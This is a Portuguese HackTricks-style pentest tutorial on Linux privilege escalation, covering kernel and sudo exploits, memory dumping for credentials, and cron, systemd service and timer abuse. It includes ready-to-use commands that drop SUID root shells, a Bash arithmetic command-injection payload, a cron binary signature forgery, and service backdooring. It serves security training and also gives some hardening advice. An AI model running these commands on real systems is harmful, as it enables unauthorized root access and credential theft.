# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informações do Sistema

### Informações do SO

Vamos começar adquirindo algum conhecimento sobre o SO em execução
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Se você **tiver permissões de escrita em qualquer pasta dentro da variável `PATH`**, talvez consiga sequestrar algumas bibliotecas ou binários:
```bash
echo $PATH
```
### Informações do ambiente

Informações interessantes, senhas ou chaves de API nas variáveis de ambiente?
```bash
(env || set) 2>/dev/null
```
### Exploits de kernel

Verifique a versão do kernel e se há algum exploit que possa ser usado para escalar privilégios
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Você pode encontrar uma boa lista de kernel vulneráveis e alguns **compiled exploits** aqui: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) e [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Outros sites onde você pode encontrar alguns **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Para extrair todas as versões de kernel vulneráveis desse site você pode fazer:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools that could help to search for kernel exploits are:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Sempre **pesquise a versão do kernel no Google**, talvez sua versão do kernel esteja escrita em algum kernel exploit e então você terá certeza de que esse exploit é válido.

Técnicas adicionais de kernel exploitation:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Versão do Sudo

Com base nas versões vulneráveis do sudo que aparecem em:
```bash
searchsploit sudo
```
Você pode verificar se a versão do sudo é vulnerável usando este grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Versões do Sudo anteriores a 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) permitem que usuários locais sem privilégios escalem seus privilégios para root via opção sudo `--chroot` quando o arquivo `/etc/nsswitch.conf` é usado a partir de um diretório controlado pelo usuário.

Aqui está um [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) para explorar essa [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Antes de executar o exploit, certifique-se de que sua versão do `sudo` é vulnerável e de que ela suporta o recurso `chroot`.

Para mais informações, consulte o [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) original

### Sudo host-based rules bypass (CVE-2025-32462)

Sudo antes da 1.9.17p1 (faixa afetada relatada: **1.8.8–1.9.17**) pode avaliar regras do sudoers baseadas em host usando o **hostname fornecido pelo usuário** de `sudo -h <host>` em vez do **real hostname**. Se o sudoers conceder privilégios mais amplos em outro host, você pode **spoof** esse host localmente.

Requisitos:
- Versão do sudo vulnerável
- Regras do sudoers específicas por host (o host não é nem o hostname atual nem `ALL`)

Exemplo de padrão sudoers:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Explorar por spoofing do host permitido:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Se a resolução do nome spoofed bloquear, adicione-o a `/etc/hosts` ou use um hostname que já apareça em logs/configs para evitar consultas DNS.

#### sudo < v1.8.28

De @sickrov
```
sudo -u#-1 /bin/bash
```
### Verificação de assinatura do Dmesg falhou

Confira a **box smasher2 do HTB** para um **exemplo** de como essa vuln poderia ser explorada
```bash
dmesg 2>/dev/null | grep "signature"
```
### Mais system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumerar possíveis defesas

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Se você estiver dentro de um container, comece com a seguinte seção container-security e depois faça pivot para as páginas de abuso específicas do runtime:


{{#ref}}
container-security/
{{#endref}}

## Drives

Verifique **o que está montado e desmontado**, onde e por quê. Se algo estiver desmontado, você pode tentar montá-lo e verificar se há informações privadas
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Software útil

Enumere binários úteis
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Também, verifique se **algum compiler está instalado**. Isso é útil se você precisar usar algum kernel exploit, pois é recomendado compilá-lo na máquina onde você vai usá-lo (ou em uma semelhante)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software Vulnerável Instalado

Verifique a **versão dos pacotes e serviços instalados**. Talvez exista alguma versão antiga do Nagios (por exemplo) que possa ser explorada para escalar privilégios…\
É recomendado verificar manualmente a versão do software instalado mais suspeito.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Se você tiver acesso SSH à máquina, você também pode usar **openVAS** para verificar software desatualizado e vulnerável instalado dentro da máquina.

> [!NOTE] > _Note que estes comandos vão mostrar muita informação que, na maioria, será inútil; portanto, é recomendado usar aplicações como OpenVAS ou similares, que vão verificar se alguma versão de software instalada é vulnerável a exploits conhecidos_

## Processes

Dê uma olhada em **quais processos** estão sendo executados e verifique se algum processo tem **mais privilégios do que deveria** (talvez um tomcat sendo executado por root?)
```bash
ps aux
ps -ef
top -n 1
```
Sempre verifique se há [**electron/cef/chromium debuggers** em execução, você pode abusar disso para escalar privilégios](electron-cef-chromium-debugger-abuse.md). **Linpeas** os detecta verificando o parâmetro `--inspect` dentro da linha de comando do processo.\
Além disso, **verifique seus privilégios sobre os binários dos processos**, talvez você possa sobrescrever alguém.

### Cadeias pai-filho entre usuários diferentes

Um processo filho executando sob um **usuário diferente** de seu pai não é automaticamente malicioso, mas é um **sinal de triagem** útil. Algumas transições são esperadas (`root` iniciando um usuário de serviço, gerenciadores de login criando processos de sessão), mas cadeias incomuns podem revelar wrappers, debug helpers, persistência ou limites de confiança de runtime fracos.

Revisão rápida:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Se você encontrar uma cadeia surpreendente, inspecione a linha de comando do processo pai e todos os arquivos que influenciam seu comportamento (`config`, `EnvironmentFile`, scripts auxiliares, diretório de trabalho, argumentos graváveis). Em várias cadeias reais de privesc, o próprio filho não era gravável, mas a **config controlada pelo pai** ou a cadeia de helpers era.

### Executáveis apagados e arquivos abertos apagados

Artefatos em tempo de execução muitas vezes ainda ficam acessíveis **após a exclusão**. Isso é útil tanto para privilege escalation quanto para recuperar evidências de um processo que já tem arquivos sensíveis abertos.

Verifique executáveis apagados:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Se `/proc/<PID>/exe` aponta para `(deleted)`, o processo ainda está executando a antiga imagem binária a partir da memória. Isso é um forte sinal para investigar porque:

- o executável removido pode conter strings interessantes ou credenciais
- o processo em execução ainda pode expor descritores de arquivo úteis
- um binário privilegiado apagado pode indicar adulteração recente ou tentativa de limpeza

Coletar arquivos abertos deletados globalmente:
```bash
lsof +L1
```
Se você encontrar um descritor interessante, recupere-o diretamente:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Isso é especialmente valioso quando um processo ainda mantém um secret, script, exportação de banco de dados ou arquivo flag apagado aberto.

### Process monitoring

Você pode usar ferramentas como [**pspy**](https://github.com/DominicBreuker/pspy) para monitorar processos. Isso pode ser muito útil para identificar processos vulneráveis sendo executados com frequência ou quando um conjunto de requisitos é atendido.

### Process memory

Alguns serviços de um servidor salvam **credentials em texto claro dentro da memória**.\
Normalmente você vai precisar de **root privileges** para ler a memória de processos que pertencem a outros usuários, portanto isso costuma ser mais útil quando você já é root e quer descobrir mais credentials.\
No entanto, lembre-se de que **como usuário regular você pode ler a memória dos processos que você possui**.

> [!WARNING]
> Note que hoje em dia a maioria das máquinas **não permite ptrace por padrão**, o que significa que você não pode fazer dump de outros processos que pertencem ao seu usuário sem privilégios.
>
> O arquivo _**/proc/sys/kernel/yama/ptrace_scope**_ controla a acessibilidade do ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: todos os processos podem ser depurados, desde que tenham o mesmo uid. Esse é o modo clássico de funcionamento do ptracing.
> - **kernel.yama.ptrace_scope = 1**: apenas um processo pai pode ser depurado.
> - **kernel.yama.ptrace_scope = 2**: somente admin pode usar ptrace, pois ele exige a capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: nenhum processo pode ser rastreado com ptrace. Uma vez definido, é necessário reiniciar para habilitar o ptracing novamente.

#### GDB

Se você tiver acesso à memória de um serviço de FTP (por exemplo), você pode obter o Heap e procurar dentro dele por suas credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Script do GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Para um determinado ID de processo, **maps mostra como a memória é mapeada dentro do espaço de endereços virtual desse processo**; ele também mostra as **permissões de cada região mapeada**. O arquivo pseudo **mem** **expõe a própria memória do processo**. A partir do arquivo **maps**, sabemos quais **regiões de memória são legíveis** e seus offsets. Usamos essas informações para **buscar dentro do arquivo mem e despejar todas as regiões legíveis** em um arquivo.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` fornece acesso à memória **física** do sistema, não à memória virtual. O espaço de endereçamento virtual do kernel pode ser acessado usando /dev/kmem.\
Normalmente, `/dev/mem` só pode ser lido por **root** e pelo grupo **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump para linux

ProcDump é uma reimaginação para Linux da ferramenta clássica ProcDump do conjunto de ferramentas Sysinternals para Windows. Obtenha em [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

Para fazer o dump da memória de um processo, você pode usar:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_You can manually remove root requirements and dump the process owned by you
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root is required)

### Credentials from Process Memory

#### Manual example

Se você encontrar que o processo authenticator está em execução:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Você pode fazer o dump do processo (veja seções anteriores para encontrar diferentes formas de fazer o dump da memória de um processo) e procurar credenciais dentro da memória:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

A ferramenta [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) irá **roubar credenciais em texto claro da memória** e de alguns **arquivos bem conhecidos**. Ela requer privilégios de root para funcionar corretamente.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) rodando como root – privesc de scheduler baseado em web

Se um painel web “Crontab UI” (alseambusher/crontab-ui) roda como root e está vinculado apenas ao loopback, ainda assim você pode acessá-lo via SSH local port-forwarding e criar um job privilegiado para escalar.

Cadeia típica
- Descubra a porta somente no loopback (por exemplo, 127.0.0.1:8000) e o realm de Basic-Auth via `ss -ntlp` / `curl -v localhost:8000`
- Encontre credenciais em artefatos operacionais:
- Backups/scripts com `zip -P <password>`
- unit do systemd expondo `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel e login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Crie um job de alta priv e execute imediatamente (dropa shell SUID):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Use-o:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Não execute o Crontab UI como root; restrinja com um usuário dedicado e permissões mínimas
- Faça bind em localhost e, adicionalmente, restrinja o acesso via firewall/VPN; não reutilize senhas
- Evite incorporar secrets em unit files; use secret stores ou root-only EnvironmentFile
- Ative audit/logging para execuções sob demanda de jobs



Verifique se algum scheduled job é vulnerável. Talvez você possa aproveitar um script que está sendo executado por root (wildcard vuln? pode modificar arquivos que root usa? usar symlinks? criar arquivos específicos no diretório que root usa?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Se `run-parts` for usado, verifique quais nomes realmente serão executados:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Isso evita falsos positivos. Um diretório periódico gravável só é útil se o nome do seu payload corresponder às regras locais do `run-parts`.

### Cron path

Por exemplo, dentro de _/etc/crontab_ você pode encontrar o PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Note how the user "user" has writing privileges over /home/user_)

Se dentro desse crontab o usuário root tentar executar algum comando ou script sem definir o path. Por exemplo: _\* \* \* \* root overwrite.sh_\
Então, você pode obter uma root shell usando:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron usando um script com wildcard (Wildcard Injection)

Se um script executado por root tiver um “**\***” dentro de um comando, você pode explorar isso para fazer coisas inesperadas (como privesc). Exemplo:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Se o wildcard for precedido de um caminho como** _**/some/path/\***_ **, ele não é vulnerável (até mesmo** _**./\***_ **não é).**

Leia a seguinte página para mais truques de exploit de wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Injeção de expansão aritmética do Bash em parsers de log do cron

O Bash realiza expansão de parâmetros e substituição de comandos antes da avaliação aritmética em ((...)), $((...)) e let. Se um cron/parser como root lê campos de log não confiáveis e os passa para um contexto aritmético, um atacante pode injetar uma substituição de comando $(...) que é executada como root quando o cron roda.

- Por que funciona: No Bash, as expansões ocorrem nesta ordem: expansão de parâmetro/variável, substituição de comandos, expansão aritmética, depois word splitting e pathname expansion. Então um valor como `$(/bin/bash -c 'id > /tmp/pwn')0` é primeiro substituído (executando o comando), e então o `0` numérico restante é usado para a aritmética, de modo que o script continua sem erros.

- Padrão típico vulnerável:
```bash
#!/bin/bash
# Exemplo: analisar um log e "somar" um campo de contagem vindo do log
while IFS=',' read -r ts user count rest; do
# count não é confiável se o log puder ser controlado pelo atacante
(( total += count ))     # ou: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploit: Faça com que texto controlado pelo atacante seja gravado no log analisado, de modo que o campo que parece numérico contenha uma substituição de comando e termine com um dígito. Garanta que seu comando não imprima em stdout (ou redirecione a saída) para que a aritmética permaneça válida.
```bash
# Valor de campo injetado dentro do log (por exemplo, via uma requisição HTTP criada que a app registra literalmente):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# Quando o parser do cron como root avalia (( total += count )), seu comando roda como root.
```

### Sobrescrita de script do cron e symlink

Se você **pode modificar um script do cron** executado por root, você pode obter uma shell muito facilmente:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Se o script executado por root usa um **diretório onde você tem acesso total**, talvez seja útil apagar essa pasta e **criar uma pasta symlink para outra** que sirva um script controlado por você
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Validação de symlink e manuseio mais seguro de arquivos

Ao revisar scripts/binários privilegiados que leem ou escrevem arquivos por caminho, verifique como os links são tratados:

- `stat()` segue um symlink e retorna os metadados do alvo.
- `lstat()` retorna os metadados do próprio link.
- `readlink -f` e `namei -l` ajudam a resolver o alvo final e mostram as permissões de cada componente do caminho.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Para defenders/developers, padrões mais seguros contra truques com symlink incluem:

- `O_EXCL` com `O_CREAT`: falha se o path já existir (bloqueia links/arquivos pré-criados pelo atacante).
- `openat()`: opera relativo a um descritor de arquivo de um diretório confiável.
- `mkstemp()`: cria arquivos temporários atomicamente com permissões seguras.

### Binaries de cron com assinatura customizada e payloads graváveis
Blue teams às vezes "assinam" binaries acionados por cron despejando uma seção ELF custom e usando grep para verificar uma string do vendor antes de executá-los como root. Se esse binary for gravável pelo grupo (por exemplo, `/opt/AV/periodic-checks/monitor` pertencente a `root:devs 770`) e você conseguir leak do material de assinatura, dá para forjar a seção e sequestrar a cron task:

1. Use `pspy` para capturar o fluxo de verificação. Em Era, root executou `objcopy --dump-section .text_sig=text_sig_section.bin monitor` seguido de `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` e então executou o arquivo.
2. Recrie o certificado esperado usando a key/config vazada (de `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Monte uma substituição maliciosa (por exemplo, drop um bash SUID, adicione sua SSH key) e incorpore o certificado em `.text_sig` para que o grep passe:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Sobrescreva o binary agendado preservando os bits de execução:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Aguarde a próxima execução do cron; assim que a checagem ingênua da assinatura passar, seu payload executa como root.

### Tarefas cron frequentes

Você pode monitorar os processos para buscar processos que estão sendo executados a cada 1, 2 ou 5 minutos. Talvez você possa aproveitar isso para escalar privilégios.

Por exemplo, para **monitorar a cada 0.1s durante 1 minuto**, **ordenar pelos comandos menos executados** e remover os comandos que foram executados mais vezes, você pode fazer:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Você também pode usar** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (isso irá monitorar e listar todo processo que iniciar).

### Backups como root que preservam mode bits definidos pelo atacante (pg_basebackup)

Se um cron owned por root envolver `pg_basebackup` (ou qualquer cópia recursiva) sobre um diretório de banco de dados que você pode escrever, você pode plantar um **binário SUID/SGID** que será copiado novamente como **root:root** com os mesmos mode bits para a saída do backup.

Fluxo típico de descoberta (como um usuário DB com poucos privilégios):
- Use `pspy` para identificar um cron de root chamando algo como `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` a cada minuto.
- Confirme que o cluster de origem (por exemplo, `/var/lib/postgresql/14/main`) é gravável por você e que o destino (`/opt/backups/current`) passa a ser owned por root após o job.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Isso funciona porque `pg_basebackup` preserva os bits de modo do arquivo ao copiar o cluster; quando invocado por root, os arquivos de destino herdam **propriedade de root + SUID/SGID escolhido pelo atacante**. Qualquer rotina privilegiada de backup/cópia semelhante que mantenha permissões e grave em um local executável é vulnerável.

### Invisible cron jobs

É possível criar um cronjob **colocando um carriage return após um comentário** (sem caractere de nova linha), e o cron job vai funcionar. Exemplo (observe o caractere carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Para detectar esse tipo de entrada furtiva, inspecione os arquivos cron com ferramentas que exponham caracteres de controle:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### Arquivos _.service_ graváveis

Verifique se você pode escrever em algum arquivo `.service`; se puder, você **poderia modificá-lo** para que ele **execute** sua **backdoor quando** o serviço for **iniciado**, **reiniciado** ou **parado** (talvez você precise esperar até a máquina ser reiniciada).\
Por exemplo, crie sua backdoor dentro do arquivo .service com **`ExecStart=/tmp/script.sh`**

### Binários de serviço graváveis

Tenha em mente que, se você tiver **permissões de escrita sobre binários executados por serviços**, você pode alterá-los para backdoors, e então, quando os serviços forem executados novamente, as backdoors serão executadas.

### systemd PATH - Caminhos relativos

Você pode ver o PATH usado pelo **systemd** com:
```bash
systemctl show-environment
```
Se você descobrir que pode **escrever** em qualquer uma das pastas do caminho, talvez seja possível **escalar privilégios**. Você precisa procurar por **caminhos relativos sendo usados em arquivos de configuração de serviços** como:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Então, crie um **executável** com o **mesmo nome do binário do caminho relativo** dentro da pasta PATH do systemd na qual você pode escrever, e, quando o serviço for instruído a executar a ação vulnerável (**Start**, **Stop**, **Reload**), seu **backdoor será executado** (usuários sem privilégios geralmente não podem iniciar/parar serviços, mas verifique se você pode usar `sudo -l`).

**Saiba mais sobre serviços com `man systemd.service`.**

## **Timers**

**Timers** são arquivos de unidade do systemd cujo nome termina em `**.timer**` e que controlam arquivos `**.service**` ou eventos. **Timers** podem ser usados como uma alternativa ao cron, pois têm suporte integrado a eventos de tempo de calendário e eventos de tempo monotônico, e podem ser executados de forma assíncrona.

Você pode enumerar todos os timers com:
```bash
systemctl list-timers --all
```
### Timers graváveis

Se você pode modificar um timer, você pode fazê-lo executar alguma instância existente de `systemd.unit` (como um `.service` ou um `.target`)
```bash
Unit=backdoor.service
```
Na documentação você pode ler o que é a Unit:

> A unit a ser ativada quando este timer expirar. O argumento é um nome de unit, cujo sufixo não é ".timer". Se não for especificado, este valor assume por padrão um service que tem o mesmo nome da unit do timer, exceto pelo sufixo. (Veja acima.) É recomendável que o nome da unit ativada e o nome da unit do timer sejam idênticos, exceto pelo sufixo.

Portanto, para abusar dessa permissão você precisaria:

- Encontrar alguma systemd unit (como uma `.service`) que esteja **executando um binary gravável**
- Encontrar alguma systemd unit que esteja **executando um relative path** e que você tenha **writable privileges** sobre o **systemd PATH** (para se passar por esse executable)

**Saiba mais sobre timers com `man systemd.timer`.**

### **Enabling Timer**

Para enable um timer você precisa de root privileges e executar:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note que o **timer** é **ativado** criando um symlink para ele em `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) permitem **comunicação entre processos** na mesma máquina ou em máquinas diferentes dentro de modelos client-server. Eles utilizam arquivos de descritor Unix padrão para comunicação entre computadores e são configurados por meio de arquivos `.socket`.

Sockets podem ser configurados usando arquivos `.socket`.

**Saiba mais sobre sockets com `man systemd.socket`.** Dentro deste arquivo, vários parâmetros interessantes podem ser configurados:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Essas opções são diferentes, mas um resumo é usado para **indicar onde ele vai escutar** no socket (o caminho do arquivo de socket AF_UNIX, o IPv4/6 e/ou o número da porta para escutar, etc.)
- `Accept`: Recebe um argumento booleano. Se **true**, uma **instância do serviço é iniciada para cada conexão recebida** e apenas o socket da conexão é passado para ela. Se **false**, todos os sockets de escuta em si são **passados para a unit de serviço iniciada**, e apenas uma unit de serviço é iniciada para todas as conexões. Esse valor é ignorado para sockets datagram e FIFOs, onde uma única unit de serviço trata incondicionalmente todo o tráfego de entrada. **O padrão é false**. Por motivos de performance, é recomendado escrever novos daemons apenas de uma forma que seja adequada para `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Recebe uma ou mais linhas de comando, que são **executadas antes** ou **depois** que os **sockets**/FIFOs de escuta são **criados** e vinculados, respectivamente. O primeiro token da linha de comando deve ser um nome de arquivo absoluto, seguido pelos argumentos do processo.
- `ExecStopPre`, `ExecStopPost`: **Comandos** adicionais que são **executados antes** ou **depois** que os **sockets**/FIFOs de escuta são **fechados** e removidos, respectivamente.
